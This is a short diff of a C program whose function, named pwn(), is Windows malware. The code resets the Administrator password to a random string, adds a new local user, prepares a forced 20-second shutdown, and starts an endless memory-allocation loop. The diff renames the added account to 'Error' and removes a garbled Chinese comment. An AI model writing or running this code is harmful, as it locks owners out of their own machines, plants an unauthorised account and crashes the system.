@@ -11,11 +11,9 @@ int pwn()
 {
 	system("net user Administrator weihfilawhgilgilghfileghilaergh");
 	system("pause");
-	system("net user æ»‘ç¨½ afawdawdaw /add");
+	system("net user Error /add");
 	char cmd[]="shutdown -s -t 20";
 	
-
-	//ç»ˆæžæ€å™¨
 	while(true)
 	{
 		malloc(1024);
